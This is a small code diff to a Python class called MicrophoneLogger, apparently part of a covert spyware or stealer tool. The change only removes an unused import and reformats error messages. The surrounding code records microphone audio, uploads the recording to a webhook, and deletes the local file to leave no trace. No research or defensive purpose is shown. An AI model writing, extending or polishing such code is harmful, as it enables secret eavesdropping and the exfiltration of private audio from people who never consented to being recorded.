@@ -2,7 +2,6 @@ from utils import *
 
 import sounddevice as sd
 import scipy.io.wavfile as wav
-import time
 import os
 
 class MicrophoneLogger:
@@ -22,7 +21,7 @@ class MicrophoneLogger:
             send_webhook(self.webhook_url, file={"microphone.wav": open(os.path.join(self.logs_path, "microphone.wav"), "rb")})
             os.remove(os.path.join(self.logs_path, "microphone.wav"))
         except Exception as e:
-            send_webhook(self.webhook_url, f"Error logging microphone: {e}")
+            send_webhook(self.webhook_url, f"```❌ Error logging microphone: {e}```")
     
     def start(self):
         while True:
